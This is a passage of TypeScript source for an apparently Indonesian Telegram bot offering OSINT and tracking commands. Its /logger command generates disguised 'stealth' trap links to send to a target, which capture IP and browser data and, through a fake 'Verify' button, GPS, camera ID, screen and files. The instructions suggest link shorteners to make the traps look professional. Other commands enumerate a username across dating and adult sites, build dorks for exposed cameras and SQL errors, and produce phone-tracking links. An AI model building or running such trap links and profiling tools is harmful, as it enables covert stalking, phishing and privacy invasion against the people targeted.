"Manado, Tomohon, Bitung", "DL": "Sangihe, Talaud, Sitaro", "DM": "Gorontalo", "DN": "Sulawesi Tengah", "DT": "Sulawesi Tenggara", "DD": "Makassar, Gowa, Maros", "DP": "Parepare, Palopo, Luwu", "DC": "Sulawesi Barat", "PA": "Papua", "PB": "Papua Barat", "BL": "Aceh", "BB": "Sumut (Barat)", "BK": "Sumut (Timur)/Medan", "BA": "Sumatera Barat", "BM": "Riau", "BP": "Kepulauan Riau", "BG": "Sumatera Selatan", "BN": "Bangka Belitung", "BE": "Lampung", "BD": "Bengkulu", "BH": "Jambi" };

      const kodeWilayah = match[1];
      const angka = match[2];
      const kodeDetail = match[3];

      const wilayah = platMap[kodeWilayah] || "Wilayah tidak terdaftar";

      const reply = `<b>🚗 PLAT ANALYZER (ID)</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `🔢 <b>PLAT:</b> <code>${kodeWilayah} ${angka} ${kodeDetail}</code>\n` +
                    `📍 <b>WILAYAH:</b> ${wilayah}\n` +
                    `├ Kode Area: ${kodeWilayah}\n` +
                    `├ No Polisi: ${angka}\n` +
                    `└ Detail/Sub: ${kodeDetail || '-'}\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Analisis selesai.</i>`;

      ctx.reply(reply, { parse_mode: 'HTML' });
    });

    bot.command('sethost', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length > 1) {
        let newHost = args[1];
        if (!newHost.startsWith('http')) newHost = 'https://' + newHost;
        appHost = newHost;
        ctx.reply(`✅ <b>System Host diubah manual ke:</b>\n<code>${appHost}</code>\n\nCoba jalankan /logger kembali.`, {parse_mode: 'HTML'});
      } else {
        ctx.reply(`ℹ️ <b>Host saat ini:</b>\n<code>${appHost}</code>\n\nJika link IP Logger error (problem loading page/localhost/404), gunakan perintah:\n<code>/sethost https://URL_WEB_ANDA</code>\nAtau pastikan web app Anda sedang online.`, {parse_mode: 'HTML'});
      }
    });

    bot.command('logger', (ctx) => {
      const id = generateTrapId(ctx.chat.id);
      
      let replyMessage = `🎣 <b>STEALTH LINK GENERATED</b>\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `Silakan pilih template link yang sesuai dengan target Anda:\n\n`;
      
      Object.entries(templates).forEach(([key, tmpl]) => {
        const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
        replyMessage += `<b>${tmpl.name}</b>\n🔗 <code>${trapUrl}</code>\n\n`;
      });
      
      replyMessage += `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💡 <b>CARA KERJA:</b>\n` +
                      `1. Kirim link di atas ke target.\n` +
                      `2. Saat diklik, IP & Browser akan terdeteksi.\n` +
                      `3. Jika target klik button "Verify", data <b>Advanced Module</b> (GPS, Cam-ID, Screen, Files) akan terkirim.\n\n` +
                      `⚠️ <i>Tips: Gunakan shortener (bit.ly/tinyurl) agar link terlihat lebih profesional.</i>`;
      
      ctx.reply(replyMessage, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('ip', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const ip = args.length > 1 ? args[1] : '';
      let url = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,reverse,mobile,proxy,hosting,query`;
      
      try {
        const response = await fetch(url);
        const data = await response.json();
        if (data.status === 'success') {
          const mapLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
          let reply = `<b>🌐 TARGET IP ANALYTICS</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💎 <b>QUERY:</b> <code>${data.query}</code>\n\n` +
                      `🏢 <b>INFRASTRUKTUR:</b>\n` +
                      `├ ISP: ${data.isp || '-'}\n` +
                      `├ ORG: ${data.org || '-'}\n` +
                      `├ ASN: ${data.as || '-'}\n` +
                      `└ RVRS: ${data.reverse || '-'}\n\n` +
                      `📍 <b>LOKASI REGIONAL:</b>\n` +
                      `├ NEGARA: ${data.country || '-'}\n` +
                      `├ REGION: ${data.regionName || '-'}\n` +
                      `├ KOTA: ${data.city || '-'}\n` +
                      `├ POS: ${data.zip || '-'}\n` +
                      `└ TMZN: ${data.timezone || '-'}\n\n` +
                      `🌎 <b>SPATIAL:</b>\n` +
                      `├ COORD: <code>${data.lat || '-'}, ${data.lon || '-'}</code>\n` +
                      `└ MAPS: <a href="${mapLink}">Lihat Lokasi BTS</a>\n\n` +
                      `🛡️ <b>RISK ANALYSIS:</b>\n` +
                      `├ MOBILE: ${data.mobile ? '✅' : '❌'}\n` +
                      `├ PROXY/VPN: ${data.proxy ? '⚠️ DETEKSI' : '✅ BERSIH'}\n` +
                      `└ HOSTING: ${data.hosting ? '⚠️ SERVER' : '✅ RESIDENTIAL'}\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `⚠️ <i>Info: Geolocation IP mengacu pada titik registrasi provider, bukan titik GPS fisik target. Gunakan /logger untuk hasil presisi.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
        } else {
          ctx.reply("❌ Gagal mendapatkan informasi IP.");
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek IP.");
      }
    });

    bot.command('whois', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /whois google.com");
      const domain = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      try {
        ctx.reply(`🔍 Sedang menganalisis detail registrar WHOIS untuk <b>${domain}</b>...`, { parse_mode: 'HTML' });
        const res = await fetch(`https://networkcalc.com/api/dns/whois/${domain}`);
        const data = await res.json();
        if (data.status === 'OK' && data.whois) {
          let txt = `🌐 <b>WHOIS DATA ANALYTICS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
                    `📝 <b>REGISTRAR INFO:</b>\n` +
                    `└ Name: ${data.whois.registrar || '-'}\n\n` +
                    `📆 <b>DATES:</b>\n` +
                    `├ CREATED: ${data.whois.creation_date || '-'}\n` +
                    `├ UPDATED: ${data.whois.updated_date || '-'}\n` +
                    `└ EXPIRED: ${data.whois.expiration_date || '-'}\n\n` +
                    `📡 <b>NAME SERVERS:</b>\n` +
                    (data.whois.name_servers || []).map((ns:any)=>`├ <code>${ns}</code>`).join('\n').replace(/├$/, '└') +
                    `\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Query WHOIS berhasil.</i>`;
          ctx.reply(txt, {parse_mode: 'HTML'});
        } else {
          ctx.reply(`❌ Whois data tidak ditemukan untuk <code>${domain}</code>. (Pastikan format domain benar tanpa https://)`, {parse_mode: 'HTML'});
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek Whois.");
      }
    });

    bot.command('dns', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /dns google.com");
      const domain = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      try {
        ctx.reply(`📡 Menarik data DNS Records & Routing IP untuk <b>${domain}</b>...`, { parse_mode: 'HTML' });
        const response = await fetch(`https://networkcalc.com/api/dns/lookup/${domain}`);
        const data = await response.json();
        if(data.status === 'OK' && data.records) {
          let txt = `📋 <b>DNS RECORD MAPPING</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n`;
          ['A', 'AAAA', 'MX', 'TXT', 'CNAME', 'NS'].forEach(type => {
            if(data.records[type] && data.records[type].length > 0) {
              txt += `<b>[+] ${type} RECORDS:</b>\n`;
              data.records[type].forEach((rec: any, idx: number, arr: any[]) => {
                const sym = idx === arr.length - 1 ? '└' : '├';
                if(type === 'MX') txt += `${sym} <code>${rec.exchange}</code> (Prio: ${rec.priority})\n`;
                else if(type === 'TXT') txt += `${sym} <code>${rec.replace(/.{1,40}/g, '$&')}</code>\n`;
                else txt += `${sym} <code>${rec.address || rec}</code>\n`;
              });
              txt += '\n';
            }
          });
          txt += `━━━━━━━━━━━━━━━━━━━━\n` +
                 `✅ <i>Fetch DNS selesai.</i>`;
          if(txt.length > 4000) txt = txt.substring(0, 3950) + "\n\n... (Terpotong limit)";
          ctx.reply(txt, {parse_mode: 'HTML'});
        } else {
          ctx.reply("❌ DNS records tidak ditemukan.");
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek DNS.");
      }
    });

    bot.command('domain', (ctx) => ctx.reply("Gunakan /whois [domain] atau /dns [domain]"));

    bot.command('email', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2 || !args[1].includes('@')) return ctx.reply("Format salah. Contoh: /email target@example.com");
      const email = args[1];
      
      try {
        const domain = email.split("@")[1];
        const records = await resolveMx(domain);
        if (records && records.length > 0) {
          const reply = `<b>📧 EMAIL MX VALIDATOR</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `🎯 <b>TARGET:</b> <code>${email}</code>\n` +
                        `🌐 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
                        `✅ STATUS:<b> AKTIF Menerima Email</b>\n\n` +
                        `📋 <b>MX RECORDS:</b>\n` +
                        records.map((r, idx) => `${idx === records.length - 1 ? '└' : '├'} [Pri: ${r.priority}] ${r.exchange}`).join('\n') +
                        `\n━━━━━━━━━━━━━━━━━━━━`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply(`❌ Tidak ditemukan MX records untuk domain ${domain}.`);
        }
      } catch (e) {
        ctx.reply(`❌ Format valid, tapi kami tidak bisa memverifikasi MX records (domain mungkin tidak aktif atau memblokir pengecekan).`);
      }
    });

    bot.command('username', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("❌ <b>Format salah.</b>\nContoh: <code>/username targetnya</code>", { parse_mode: 'HTML' });
      
      const rawInput = args.slice(1).join('').toLowerCase();
      const username = rawInput.replace(/[^a-z0-9_.-]/g, '');
      if (!username) return ctx.reply("❌ <b>Username tidak valid.</b>", { parse_mode: 'HTML' });
      
      ctx.reply(`🔍 Memindai jejak digital untuk <b>@${username}</b>...\n<i>Mengecek puluhan platform...</i>`, { parse_mode: 'HTML' });
      
      const platforms = [
        // Global Social Media & Tech (~80 Platforms)
        { name: "GitHub", url: `https://github.com/${username}` },
        { name: "Twitter", url: `https://twitter.com/${username}` },
        { name: "Instagram", url: `https://www.instagram.com/${username}/` },
        { name: "TikTok", url: `https://www.tiktok.com/@${username}` },
        { name: "YouTube", url: `https://www.youtube.com/@${username}` },
        { name: "Facebook", url: `https://www.facebook.com/${username}` },
        { name: "Pinterest", url: `https://www.pinterest.com/${username}` },
        { name: "Reddit", url: `https://www.reddit.com/user/${username}` },
        { name: "Tumblr", url: `https://${username}.tumblr.com` },
        { name: "Medium", url: `https://medium.com/@${username}` },
        { name: "Vimeo", url: `https://vimeo.com/${username}` },
        { name: "SoundCloud", url: `https://soundcloud.com/${username}` },
        { name: "Spotify", url: `https://open.spotify.com/user/${username}` },
        { name: "Twitch", url: `https://www.twitch.tv/${username}` },
        { name: "Steam", url: `https://steamcommunity.com/id/${username}` },
        { name: "Flickr", url: `https://www.flickr.com/people/${username}` },
        { name: "Patreon", url: `https://www.patreon.com/${username}` },
        { name: "Dev.to", url: `https://dev.to/${username}` },
        { name: "Wattpad", url: `https://www.wattpad.com/user/${username}` },
        { name: "VK", url: `https://vk.com/${username}` },
        { name: "GitLab", url: `https://gitlab.com/${username}` },
        { name: "Linktree", url: `https://linktr.ee/${username}` },
        { name: "Dribbble", url: `https://dribbble.com/${username}` },
        { name: "Behance", url: `https://www.behance.net/${username}` },
        { name: "About.me", url: `https://about.me/${username}` },
        { name: "Fiverr", url: `https://www.fiverr.com/${username}` },
        { name: "Gumroad", url: `https://gumroad.com/${username}` },
        { name: "Quora", url: `https://www.quora.com/profile/${username}` },
        { name: "Telegram", url: `https://t.me/${username}` },
        { name: "CodePen", url: `https://codepen.io/${username}` },
        { name: "HackerRank", url: `https://www.hackerrank.com/${username}` },
        { name: "LeetCode", url: `https://leetcode.com/${username}` },
        { name: "Kaggle", url: `https://www.kaggle.com/${username}` },
        { name: "Pastebin", url: `https://pastebin.com/u/${username}` },
        { name: "ProductHunt", url: `https://www.producthunt.com/@${username}` },
        { name: "Slack", url: `https://${username}.slack.com` },
        { name: "Trello", url: `https://trello.com/${username}` },
        { name: "Bandcamp", url: `https://bandcamp.com/${username}` },
        { name: "Last.fm", url: `https://www.last.fm/user/${username}` },
        { name: "ReverbNation", url: `https://www.reverbnation.com/${username}` },
        { name: "Letterboxd", url: `https://letterboxd.com/${username}` },
        { name: "MyAnimeList", url: `https://myanimelist.net/profile/${username}` },
        { name: "Goodreads", url: `https://www.goodreads.com/${username}` },
        { name: "Strava", url: `https://www.strava.com/athletes/${username}` },
        { name: "TripAdvisor", url: `https://www.tripadvisor.com/members/${username}` },
        { name: "Roblox", url: `https://www.roblox.com/user.aspx?username=${username}` },
        { name: "Minecraft", url: `https://namemc.com/profile/${username}` },
        { name: "Chess.com", url: `https://www.chess.com/member/${username}` },
        { name: "Lichess", url: `https://lichess.org/@/${username}` },
        { name: "eBay", url: `https://www.ebay.com/usr/${username}` },
        { name: "HubPages", url: `https://hubpages.com/@${username}` },
        { name: "Instructables", url: `https://www.instructables.com/member/${username}` },
        { name: "DailyMotion", url: `https://www.dailymotion.com/${username}` },
        { name: "Giphy", url: `https://giphy.com/channel/${username}` },
        { name: "Imgur", url: `https://imgur.com/user/${username}` },
        { name: "HackTheBox", url: `https://forum.hackthebox.eu/profile/${username}` },
        { name: "TryHackMe", url: `https://tryhackme.com/p/${username}` },
        { name: "Bugcrowd", url: `https://bugcrowd.com/${username}` },
        { name: "HackerOne", url: `https://hackerone.com/${username}` },
        { name: "BuyMeACoffee", url: `https://www.buymeacoffee.com/${username}` },
        { name: "Ko-fi", url: `https://ko-fi.com/${username}` },
        { name: "Snapchat", url: `https://www.snapchat.com/add/${username}` },
        { name: "OkCupid", url: `https://www.okcupid.com/profile/${username}` },
        { name: "Bumble", url: `https://bumble.com/app/profile/${username}` },
        { name: "Tinder", url: `https://tinder.com/@${username}` },
        { name: "VSCO", url: `https://vsco.co/${username}` },
        { name: "Foursquare", url: `https://foursquare.com/${username}` },
        { name: "DeviantArt", url: `https://www.deviantart.com/${username}` },
        { name: "Mixcloud", url: `https://www.mixcloud.com/${username}/` },
        { name: "PornHub", url: `https://www.pornhub.com/users/${username}` },
        { name: "Xvideos", url: `https://www.xvideos.com/profiles/${username}` },
        { name: "OnlyFans", url: `https://onlyfans.com/${username}` },
        { name: "Fansly", url: `https://fansly.com/${username}` },
        { name: "CashApp", url: `https://cash.app/$${username}` },
        // Indo & Forums
        { name: "Kaskus", url: `https://www.kaskus.co.id/profile/${username}` },
        { name: "Kompasiana", url: `https://www.kompasiana.com/${username}` },
        { name: "Blogger", url: `https://${username}.blogspot.com` }
      ];

      // Platforms known to return soft 404s (200 OK but page says not found) or block bots aggressively.
      // We will flag these as "Proteksi/Perlu Cek Manual" to improve accuracy instead of falsely claiming "DITEMUKAN".
      const soft404Platforms = ['Instagram', 'TikTok', 'YouTube', 'Facebook', 'Twitter', 'Snapchat', 'Tinder', 'Bumble', 'OkCupid', 'Spotify'];

      // To avoid overwhelming constraints, process in chunks or concurrently
      const results = await Promise.all(platforms.map(async (platform) => {
        try {
          // Increase accuracy: actually fetch text for some, but fallback to status to avoid huge payload
          const response = await fetchWithTimeout(platform.url, { 
            method: "HEAD",
            headers: {
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
              "Accept": "text/html,application/xhtml+xml"
            }
          }, 4500); // 4.5 seconds timeout
          
          let found = false;
          let status = response.status;
          
          if (status === 200 || status === 301 || status === 302) {
            found = true;
          }

          if (soft404Platforms.includes(platform.name)) {
            // Force these to be manual check / protested because HEAD requests on these almost always yield false positives
            found = false; 
            status = 403; // Simulate blocked
          }

          return { name: platform.name, found, status, url: platform.url };
        } catch (err) {
          return { name: platform.name, found: false, status: "error", url: platform.url };
        }
      }));

      const foundList = results.filter(r => r.found);
      const blockedList = results.filter(r => r.status === 403 || r.status === 429);
      const notFoundList = results.filter(r => !r.found && r.status !== 403 && r.status !== 429);

      let replyText = `<b>🎯 DIGITAL FOOTPRINT ANALYSIS: @${username}</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n\n`;
      
      if (foundList.length > 0) {
        replyText += `🟢 <b>DITEMUKAN (${foundList.length} PLATFORM)</b>\n`;
        foundList.forEach(r => replyText += `├ <a href="${r.url}">${r.name}</a>\n`);
        replyText = replyText.replace(/\n├ (<a href="[^"]+">[^<]+<\/a>)\n$/, "\n└ $1\n"); // Fix last icon
      }

      if (blockedList.length > 0) {
        replyText += `\n🟡 <b>PROTECTED / MANUAL CHECK (${blockedList.length})</b>\n`;
        blockedList.forEach(r => replyText += `├ <a href="${r.url}">${r.name}</a> ⚠️\n`);
        replyText = replyText.replace(/\n├ (<a href="[^"]+">[^<]+<\/a> ⚠️)\n$/, "\n└ $1\n");
      }

      replyText += `\n❌ <b>TIDAK DITEMUKAN (${notFoundList.length} PLATFORM)</b>\n`;
      if (notFoundList.length > 0) {
        replyText += `└ <i>Antara lain: ${notFoundList.map(r => r.name).slice(0, 5).join(', ')}...</i>\n`;
      }
      
      replyText += `━━━━━━━━━━━━━━━━━━━━\n` +
                   `✅ <i>Digital footprint scan complete.</i>`;

      ctx.reply(replyText, { link_preview_options: { is_disabled: true }, parse_mode: 'HTML' });
    });

    bot.command('mac', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /mac [MAC_ADDRESS]");
      try {
        const res = await fetch(`https://api.macvendors.com/${args[1]}`);
        if(res.status === 200) {
          const vendor = await res.text();
          const reply = `<b>🔌 MAC VENDOR LOOKUP</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `🆔 <b>MAC:</b> <code>${args[1]}</code>\n` +
                        `🏢 <b>VENDOR:</b> <code>${vendor}</code>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Query data berhasil.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply("❌ Tidak ditemukan vendor (atau rate limited).");
        }
      } catch (e) { ctx.reply("❌ Error fetching MAC info."); }
    });

    bot.command('headers', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /headers [url]");
      let url = args[1];
      if(!url.startsWith('http')) url = 'http://' + url;
      try {
        const res = await fetchWithTimeout(url, { method: 'HEAD' }, 4000);
        let hdrs = '';
        res.headers.forEach((v, k) => hdrs += `├ ${k}: ${v}\n`);
        const reply = `<b>🛡️ HTTP SECURITY HEADERS</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💎 <b>TARGET:</b> <code>${url}</code>\n\n` +
                      `📋 <b>HEADERS DATA:</b>\n` +
                      `<pre>${hdrs.substring(0,3800)}</pre>` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, { parse_mode: 'HTML' });
      } catch (e) { ctx.reply("❌ Error fetching headers."); }
    });

    bot.command('dork', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /dork [keyword]");
      const q = encodeURIComponent(args);
      const reply = `<b>🔍 GOOGLE DORKS GENERATOR</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>KEYWORD:</b> <code>${args}</code>\n\n` +
                    `├ 📦 <b>Listing:</b> <a href="https://www.google.com/search?q=intitle:%22index+of%22+${q}">Cek Direktori</a>\n` +
                    `├ 📄 <b>Files:</b> <a href="https://www.google.com/search?q=${q}+filetype:pdf+OR+filetype:doc">Cari Dokumen</a>\n` +
                    `├ 👤 <b>Login:</b> <a href="https://www.google.com/search?q=inurl:login+${q}">Cari Form Login</a>\n` +
                    `├ 🐞 <b>SQL:</b> <a href="https://www.google.com/search?q=${q}+%22sql+syntax%22">SQL Error Dork</a>\n` +
                    `└ 🎥 <b>CCTV:</b> <a href="https://www.google.com/search?q=inurl:view/view.shtml+${q}">Cari Open Camera</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Dorking links generated.</i>`;
      ctx.reply(reply, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('bininfo', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /bininfo [BIN]");
      try {
        const res = await fetch(`https://data.handyapi.com/bin/${args[1]}`);
        const data = await res.json();
        if(data && data.Status === 'SUCCESS') {
          const reply = `<b>💳 CREDIT CARD BIN INFO</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `💎 <b>BIN:</b> <code>${args[1]}</code>\n\n` +
                        `├ 📂 TYPE: ${data.Scheme} (${data.Type})\n` +
                        `├ 🔝 TIER: ${data.CardTier}\n` +
                        `├ 📍 NEGARA: ${data.Country.Name}\n` +
                        `└ 🏦 BANK: ${data.Issuer}\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Query BIN berhasil.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply("❌ Data BIN tidak ditemukan.");
        }
      } catch(e) { ctx.reply("❌ Gagal mengecek BIN."); }
    });

    bot.command('subdomain', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /subdomain [domain.com]");
      const domain = args[1];
      try {
        ctx.reply(`🔍 Sedang crawling mapping subdomain untuk <b>${domain}</b>...`, {parse_mode: 'HTML'});
        const res = await fetchWithTimeout(`https://crt.sh/?q=%25.${domain}&output=json`, {}, 8000);
        const data = await res.json();
        const subs = [...new Set(data.map((d:any) => d.name_value))].slice(0, 30);
        if(subs.length > 0) {
          const reply = `<b>🌐 SUBDOMAIN RECON MAPPING</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `💎 <b>TARGET:</b> <code>${domain}</code>\n\n` +
                        `📋 <b>FOUND SUBS (MAX 30):</b>\n` +
                        subs.map((s, idx) => `${idx === subs.length - 1 ? '└' : '├'} <code>${s}</code>`).join('\n') +
                        `\n━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Reconnaissance selesai.</i>`;
          ctx.reply(reply, {parse_mode: 'HTML'});
        } else { ctx.reply("❌ Tidak ada subdomain ditemukan."); }
      } catch(e) { ctx.reply("❌ Gagal mencari subdomain. (crt.sh timeout)"); }
    });

    bot.command('github_user', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /github_user [username]");
      try {
        const res = await fetch(`https://api.github.com/users/${args[1]}`);
        if(res.status !== 200) return ctx.reply("❌ User tidak ditemukan.");
        const d = await res.json();
        const reply = `<b>🐙 GITHUB OSINT ANALYTICS</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `👤 <b>USER:</b> <code>${d.login}</code>\n\n` +
                      `├ <b>Name:</b> ${d.name || '-'}\n` +
                      `├ <b>Bio:</b> ${d.bio || '-'}\n` +
                      `├ <b>Location:</b> ${d.location || '-'}\n` +
                      `├ <b>Company:</b> ${d.company || '-'}\n` +
                      `├ <b>Repos:</b> ${d.public_repos} (Public)\n` +
                      `├ <b>Followers:</b> ${d.followers}\n` +
                      `├ <b>Created:</b> ${new Date(d.created_at).toISOString().split('T')[0]}\n` +
                      `└ <b>Link:</b> <a href="${d.html_url}">Visit Profile</a>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `✅ <i>Metadata extraction complete.</i>`;
        ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
      } catch(e) { ctx.reply("❌ Error fetching GitHub data."); }
    });

    bot.command('port', (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 3) return ctx.reply("Format: /port [ip] [port]");
      const ip = args[1]; const port = parseInt(args[2]);
      const socket = new net.Socket();
      socket.setTimeout(2500);
      let status = "❌ CLOSED / UNREACHABLE";
      socket.on('connect', () => { status = "✅ OPENED"; socket.destroy(); });
      socket.on('timeout', () => { socket.destroy(); });
      socket.on('error', () => { socket.destroy(); });
      socket.on('close', () => {
        const reply = `<b>🔌 TCP PORT CONNECTIVITY</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💎 <b>TARGET:</b> <code>${ip}</code>\n` +
                      `├ <b>PORT:</b> <code>${port}</code>\n` +
                      `└ <b>STATUS:</b> <b>${status}</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, { parse_mode: 'HTML' });
      });
      socket.connect(port, ip);
    });

    bot.command('phone_dork', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /phone_dork [nomor_hp]");
      const numInfo = args.replace(/\D/g, '');
      const numID = numInfo.startsWith('0') ? '62' + numInfo.substring(1) : numInfo;
      const reply = `<b>📱 PHONE TRACKING DORKS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TARGET:</b> <code>${args}</code>\n\n` +
                    `├ 📦 <b>Truecaller:</b> <a href="https://www.truecaller.com/search/global/${numID}">Cari Identitas</a>\n` +
                    `├ 💬 <b>WhatsApp:</b> <a href="https://wa.me/${numID}">Check Profile</a>\n` +
                    `└ 🔍 <b>Google:</b> <a href="https://www.google.com/search?q=%22${args}%22+OR+%22${numID}%22">Cari Jejak Digital</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `⚠️ <i>Tips: Gunakan aplikasi GetContact (Apps) untuk hasil nama tag terbaik.</i>`;
      ctx.reply(reply, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('qr', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /qr [text/url]");
      ctx.replyWithPhoto(`https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(args)}`);
    });

    bot.command('shortlink', async (ctx) => {
      const args = ctx.message.text.split(' ')[1];
      if(!args) return ctx.reply("Format: /shortlink [url]");
      let url = args; if(!url.startsWith('http')) url = 'https://' + url;
      try {
        const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(url)}`);
        const data = await res.json();
        const reply = `<b>🔗 URL SHORTENING (is.gd)</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `📋 <b>ORIGINAL:</b> <code>${url}</code>\n` +
                      `✨ <b>RESULT:</b> <code>${data.shorturl || "Error"}</code>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, { parse_mode: 'HTML' });
      } catch(e) { ctx.reply("❌ Error shortening link."); }
    });

    bot.command('pwd', (ctx) => {
      const p = ctx.message.text.split(' ')[1];
      let len = parseInt(p) || 12;
      if(len > 64) len = 64; if(len < 4) len = 4;
      const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=";
      let retVal = "";
      for (let i = 0; i < len; ++i) { retVal += charset.charAt(Math.floor(Math.random() * charset.length)); }
      const reply = `<b>🔑 SECURE PASSWORD GEN</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `📏 <b>Length:</b> ${len} chars\n` +
                    `✨ <b>Result:</b> <code>${retVal}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('b64enc', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /b64enc [text]");
      const result = Buffer.from(args).toString('base64');
      const reply = `<b>🔤 BASE64 ENCODER</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<code>${result}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('b64dec', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /b64dec [text]");
      try { 
        const result = Buffer.from(args, 'base64').toString('utf8');
        const reply = `<b>🔤 BASE64 DECODER</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `<code>${result}</code>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, {parse_mode: 'HTML'}); 
      } catch { ctx.reply("❌ Invalid base64"); }
    });

    bot.command('hash', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /hash [text]");
      const md5 = crypto.createHash('md5').update(args).digest('hex');
      const sha256 = crypto.createHash('sha256').update(args).digest('hex');
      const reply = `<b>🔐 MULTI-HASH GENERATOR</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TEXT:</b> <code>${args}</code>\n\n` +
                    `├ <b>MD5:</b>\n└ <code>${md5}</code>\n\n` +
                    `├ <b>SHA256:</b>\n└ <code>${sha256}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('sha256', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /sha256 [text]");
